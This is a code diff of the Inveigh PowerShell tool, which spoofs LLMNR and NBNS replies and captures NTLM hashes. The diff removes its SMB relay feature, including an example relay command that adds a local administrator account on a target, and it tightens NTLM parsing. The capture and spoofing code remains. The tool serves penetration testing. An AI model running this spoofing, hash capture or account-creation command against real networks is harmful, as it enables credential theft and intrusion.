@@ -124,30 +124,10 @@ prevent login requests from being processed by the Inveigh host.
 
 .PARAMETER Challenge
 Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
-random challenge will be generated for each request. This will only be used for non-relay captures.
+random challenge will be generated for each request.
 
 .PARAMETER MachineAccounts
 Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
-
-.PARAMETER SMBRelay
-Default = Disabled: (Y/N) Enable/Disable SMB relay. Note that Inveigh-Relay.ps1 must be loaded into memory.
-
-.PARAMETER SMBRelayTarget
-IP address of system to target for SMB relay.
-
-.PARAMETER SMBRelayCommand
-Command to execute on SMB relay target.
-
-.PARAMETER SMBRelayUsernames
-Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
-domain\username format. 
-
-.PARAMETER SMBRelayAutoDisable
-Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.
-
-.PARAMETER SMBRelayNetworkTimeout
-Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay
- target after each packet is sent.
 
 .PARAMETER ConsoleOutput
 Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
@@ -220,12 +200,7 @@ useful for sending traffic to a controlled Linux system on another subnet.
 
 .EXAMPLE
 Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
-Execute specifying an HTTP redirect response.
-
-.EXAMPLE
-Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2016 /add && net localgroup administrators Dave /add"
-Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
-target.  
+Execute specifying an HTTP redirect response. 
 
 .NOTES
 1. An elevated administrator or SYSTEM shell is needed.
@@ -261,8 +236,6 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp="Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMBRelay="N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMBRelayAutoDisable="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADEmptyFile="Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool="0",
     [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth="NTLM",
@@ -271,7 +244,6 @@ param
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP="",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP="",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SMBRelayTarget ="",
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir="",
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir="",
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge="",
@@ -279,14 +251,12 @@ param
     [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore="",
     [parameter(Mandatory=$false)][Array]$SpooferIPsReply="",
     [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore="",
-    [parameter(Mandatory=$false)][Array]$SMBRelayUsernames="",
     [parameter(Mandatory=$false)][Array]$WPADDirectHosts="",
     [parameter(Mandatory=$false)][Int]$ConsoleStatus="",
     [parameter(Mandatory=$false)][Int]$LLMNRTTL="30",
     [parameter(Mandatory=$false)][Int]$NBNSTTL="165",
     [parameter(Mandatory=$false)][Int]$WPADPort="",
     [parameter(Mandatory=$false)][Int]$RunTime="",
-    [parameter(Mandatory=$false)][Int]$SMBRelayNetworkTimeout="",
     [parameter(Mandatory=$false)][String]$HTTPBasicRealm="IIS",
     [parameter(Mandatory=$false)][String]$HTTPDefaultFile="",
     [parameter(Mandatory=$false)][String]$HTTPDefaultEXE="",
@@ -294,7 +264,6 @@ param
     [parameter(Mandatory=$false)][String]$HTTPSCertAppID="00112233-4455-6677-8899-AABBCCDDEEFF",
     [parameter(Mandatory=$false)][String]$HTTPSCertThumbprint="98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
     [parameter(Mandatory=$false)][String]$WPADResponse="",
-    [parameter(Mandatory=$false)][String]$SMBRelayCommand="",
     [parameter(Mandatory=$false)][Switch]$Inspect,
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
@@ -312,30 +281,6 @@ if(!$IP)
 if(!$SpooferIP)
 {
     $SpooferIP = $IP  
-}
-
-if($SMBRelay -eq 'Y')
-{
-
-    if(!$SMBRelayTarget)
-    {
-        throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
-    }
-
-    if(!$SMBRelayCommand)
-    {
-        throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
-    }
-
-    if($Challenge -or $HTTPDefaultFile -or $HTTPDefaultEXE -or $HTTPResponse -or $WPADIP -or $WPADPort -or $WPADResponse)
-    {
-        throw "-Challenge -HTTPDefaultFile, -HTTPDefaultEXE, -HTTPResponse, -WPADIP, -WPADPort, and -WPADResponse can not be used when enabling -SMBRelay"
-    }
-    elseif($HTTPAuth -ne 'NTLM' -or $WPADAuth -eq 'Basic')
-    {
-        throw "Only -HTTPAuth NTLM, -WPADAuth NTLM, and -WPADAuth Anonymous can be used when enabling -SMBRelay"
-    }
-
 }
 
 if($HTTPDefaultFile -or $HTTPDefaultEXE)
@@ -382,16 +327,11 @@ if(!$inveigh)
     $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
     $inveigh.cleartext_list = New-Object System.Collections.ArrayList
     $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
-    $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
 }
 
 if($inveigh.running)
 {
     throw "Invoke-Inveigh is already running, use Stop-Inveigh"
-}
-elseif($inveigh.relay_running)
-{
-    throw "Invoke-InveighRelay is already running, use Stop-Inveigh"
 }
 
 $inveigh.sniffer_socket = $null
@@ -479,7 +419,7 @@ else
 $inveigh.status_queue.Add("Inveigh started at $(Get-Date -format 's')")  > $null
 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh started")]) > $null
 
-$firewall_status = netsh advfirewall show allprofiles state | where {$_ -match 'ON'}
+$firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
 
 if($firewall_status)
 {
@@ -755,56 +695,51 @@ elseif($RunTime -gt 1)
     $inveigh.status_queue.Add("Run Time = $RunTime Minutes")  > $null
 }
 
-if($SMBRelay -eq 'N')
+if($ShowHelp -eq 'Y')
 {
-
-    if($ShowHelp -eq 'Y')
-    {
-        $inveigh.status_queue.Add("Use Get-Command -Noun Inveigh* to show available functions")  > $null
-        $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh")  > $null
+    $inveigh.status_queue.Add("Use Get-Command -Noun Inveigh* to show available functions")  > $null
+    $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh")  > $null
         
-        if($inveigh.console_output)
-        {
-            $inveigh.status_queue.Add("Press any key to stop real time console output")  > $null
-        }
-
+    if($inveigh.console_output)
+    {
+        $inveigh.status_queue.Add("Press any key to stop real time console output")  > $null
     }
 
-    if($inveigh.status_output)
+}
+
+if($inveigh.status_output)
+{
+
+    while($inveigh.status_queue.Count -gt 0)
     {
 
-        while($inveigh.status_queue.Count -gt 0)
+        if($inveigh.output_stream_only)
+        {
+            Write-Output($inveigh.status_queue[0] + $inveigh.newline)
+            $inveigh.status_queue.RemoveRange(0,1)
+        }
+        else
         {
 
-            if($inveigh.output_stream_only)
-            {
-                Write-Output($inveigh.status_queue[0] + $inveigh.newline)
-                $inveigh.status_queue.RemoveRange(0,1)
-            }
-            else
+            switch ($inveigh.status_queue[0])
             {
 
-                switch ($inveigh.status_queue[0])
+                "Run Stop-Inveigh to stop Inveigh"
                 {
+                    Write-Warning($inveigh.status_queue[0])
+                    $inveigh.status_queue.RemoveRange(0,1)
+                }
 
-                    "Run Stop-Inveigh to stop Inveigh"
-                    {
-                        Write-Warning($inveigh.status_queue[0])
-                        $inveigh.status_queue.RemoveRange(0,1)
-                    }
+                "Windows Firewall = Enabled"
+                {
+                    Write-Warning($inveigh.status_queue[0])
+                    $inveigh.status_queue.RemoveRange(0,1)
+                }
 
-                    "Windows Firewall = Enabled"
-                    {
-                        Write-Warning($inveigh.status_queue[0])
-                        $inveigh.status_queue.RemoveRange(0,1)
-                    }
-
-                    default
-                    {
-                        Write-Output($inveigh.status_queue[0])
-                        $inveigh.status_queue.RemoveRange(0,1)
-                    }
-
+                default
+                {
+                    Write-Output($inveigh.status_queue[0])
+                    $inveigh.status_queue.RemoveRange(0,1)
                 }
 
             }
@@ -812,18 +747,7 @@ if($SMBRelay -eq 'N')
         }
 
     }
-}
-else
-{
-    try
-    {
-        Invoke-InveighRelay -HTTP $HTTP -HTTPS $HTTPS -HTTPSCertAppID $HTTPSCertAppID -HTTPSCertThumbprint $HTTPSCertThumbprint -WPADAuth $WPADAuth -SMBRelayTarget $SMBRelayTarget -SMBRelayUsernames $SMBRelayUsernames -SMBRelayAutoDisable $SMBRelayAutoDisable -SMBRelayNetworkTimeout $SMBRelayNetworkTimeout -SMBRelayCommand $SMBRelayCommand -Tool $Tool -ShowHelp $ShowHelp 
-    }
-    catch
-    {
-        $inveigh.running = $false        
-        throw "Invoke-InveighRelay is not loaded"
-    }
+
 }
 
 # Begin ScriptBlocks
@@ -831,6 +755,7 @@ else
 # Shared Basic Functions ScriptBlock
 $shared_basic_functions_scriptblock =
 {
+
     function DataToUInt16($field)
     {
 	   [Array]::Reverse($field)
@@ -869,6 +794,7 @@ $shared_basic_functions_scriptblock =
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
         return $string_extract
     }
+
 }
 
 # SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
@@ -883,7 +809,7 @@ $SMB_NTLM_functions_scriptblock =
         $payload = $payload -replace "-",""
         $NTLM_index = $payload.IndexOf("4E544C4D53535000")
 
-        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
+        if($NTLM_index -gt 0 -and $payload.SubString(($NTLM_index + 16),8) -eq "02000000")
         {
             $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
         }
@@ -899,7 +825,7 @@ $SMB_NTLM_functions_scriptblock =
         $payload = $payload -replace "-",""
         $NTLMSSP_hex_offset = $payload.IndexOf("4E544C4D53535000")
 
-        if($payload.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
+        if($NTLMSSP_hex_offset -gt 0 -and $payload.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
         {
             $NTLMSSP_offset = $NTLMSSP_hex_offset / 2
 
@@ -1350,7 +1276,7 @@ $sniffer_scriptblock =
 
     if($RunTime)
     {    
-        $sniffer_timeout = new-timespan -Minutes $RunTime
+        $sniffer_timeout = New-TimeSpan -Minutes $RunTime
         $sniffer_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
 
@@ -1397,7 +1323,16 @@ $sniffer_scriptblock =
                     {
                         if($SMB -eq 'Y')
                         {
-                            SMBNTLMResponse $payload_bytes
+
+                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
+                            {
+                                SMBNTLMResponse $payload_bytes
+                            }
+
+                            $client_IP = ''
+                            $client_port = ''
+                            $NTLM_challenge = ''
+                        
                         }
                     }
 
@@ -1406,7 +1341,16 @@ $sniffer_scriptblock =
                      
                         if($SMB -eq 'Y')
                         {
-                            SMBNTLMResponse $payload_bytes
+
+                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
+                            {
+                                SMBNTLMResponse $payload_bytes
+                            }
+
+                            $client_IP = ''
+                            $client_port = ''
+                            $NTLM_challenge = ''
+
                         }
                     
                     }
@@ -1422,6 +1366,8 @@ $sniffer_scriptblock =
 
                         if($SMB -eq 'Y')
                         {   
+                            $client_IP = $destination_IP 
+                            $client_port = $destination_port
                             $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                         }
                     
@@ -1432,6 +1378,8 @@ $sniffer_scriptblock =
 
                         if($SMB -eq 'Y')
                         {   
+                            $client_IP = $destination_IP 
+                            $client_port = $destination_port
                             $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                         }
                     
@@ -1465,8 +1413,7 @@ $sniffer_scriptblock =
                             $NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +
                                                   $NBNS_TTL_bytes +
                                                   0x00,0x06,0x00,0x00 +
-                                                  ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
-                                                  0x00,0x00,0x00,0x00
+                                                  ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                 
                             $NBNS_response_packet = 0x00,0x89 +
                                                     $source_port[1,0] +
@@ -1553,7 +1500,7 @@ $sniffer_scriptblock =
                                 if($NBNSTypes -contains $NBNS_query_type)
                                 {
                                  
-                                    if ((!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString))
+                                    if ((!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($NBNS_query_string.Trim() -ne '*'))
                                     {
                                         $send_socket.sendTo($NBNS_response_packet,$destination_point)
                                         $send_socket.Close()
@@ -1577,6 +1524,10 @@ $sniffer_scriptblock =
                                         elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                         {
                                             $NBNS_response_message = "- $source_IP is on ignore list"
+                                        }
+                                        elseif($NBNS_query_string.Trim() -eq '*')
+                                        {
+                                            $NBNS_response_message = "- ignoring NBSTAT request"
                                         }
                                         else
                                         {
@@ -1632,9 +1583,6 @@ $sniffer_scriptblock =
                                 $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                 $LLMNR_query_string = New-Object System.String($LLMNR_query,0,$LLMNR_query.Length)
                             }
-
-                            
-                            $inveigh.console_queue.Add($LLMNR_query_string)
                 
                             if($LLMNR -eq 'Y')
                             {
@@ -1697,14 +1645,6 @@ $sniffer_scriptblock =
                     $inveigh.HTTP_listener.Stop()
                     $inveigh.HTTP_listener.Close()
                 }
-
-                if($inveigh.relay_running)
-                {
-                    $inveigh.console_queue.Add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
-                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
-                    Start-Sleep -m 5
-                    $inveigh.relay_running = $false
-                } 
 
                 $inveigh.console_queue.Add("Inveigh exited due to run time at $(Get-Date -format 's')")
                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to run time")])
@@ -1837,7 +1777,7 @@ function SnifferSpoofer()
 # Startup Enabled Services
 
 # HTTP Server Start
-if(($inveigh.HTTP -or $inveigh.HTTPS) -and $SMBRelay -eq 'N')
+if($inveigh.HTTP -or $inveigh.HTTPS)
 {
     HTTPListener
 }
@@ -1850,7 +1790,7 @@ if($inveigh.console_output)
 
     if($ConsoleStatus)
     {    
-        $console_status_timeout = new-timespan -Minutes $ConsoleStatus
+        $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
         $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
 
@@ -2040,7 +1980,7 @@ function Stop-Inveigh
 
     if($inveigh)
     {
-        if($inveigh.running -or $inveigh.relay_running -or $inveigh.bruteforce_running)
+        if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
         {
 
             if($inveigh.HTTP_listener.IsListening)
@@ -2049,21 +1989,21 @@ function Stop-Inveigh
                 $inveigh.HTTP_listener.Close()
             }
             
-            if($inveigh.bruteforce_running)
+            if($inveigh.unprivileged_running)
             {
-                $inveigh.bruteforce_running = $false
+                $inveigh.unprivileged_running = $false
                 Write-Output("$(Get-Date -format 's') - Attempting to stop HTTP listener")
                 $inveigh.HTTP_listener.server.blocking = $false
                 Start-Sleep -s 1
                 $inveigh.HTTP_listener.server.Close()
                 Start-Sleep -s 1
                 $inveigh.HTTP_listener.Stop()
-                Write-Output("Inveigh Brute Force exited at $(Get-Date -format 's')")
-                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Brute Force exited")  > $null
+                Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null
 
                 if($inveigh.file_output)
                 {
-                    "$(Get-Date -format 's') - Inveigh Brute Force exited" | Out-File $Inveigh.log_out_file -Append
+                    "$(Get-Date -format 's') - Inveigh Unprivileged exited" | Out-File $Inveigh.log_out_file -Append
                 }
 
             }
@@ -2366,12 +2306,12 @@ function Watch-Inveigh
     if($inveigh.tool -ne 1)
     {
 
-        if($inveigh.running -or $inveigh.relay_running -or $inveigh.bruteforce_running)
+        if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
         {
             Write-Output "Press any key to stop real time console output"
             $inveigh.console_output = $true
 
-            :console_loop while((($inveigh.running -or $inveigh.relay_running -or $inveigh.bruteforce_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
+            :console_loop while((($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
             {
 
                 while($inveigh.console_queue.Count -gt 0)
@@ -2468,7 +2408,7 @@ function Clear-Inveigh
     if($inveigh)
     {
 
-        if(!$inveigh.running -and !$inveigh.relay_running -and !$inveigh.bruteforce_running)
+        if(!$inveigh.running -and !$inveigh.relay_running -and !$inveigh.unprivileged_running)
         {
             Remove-Variable inveigh -scope global
             Write-Output "Inveigh data has been cleared from memory"
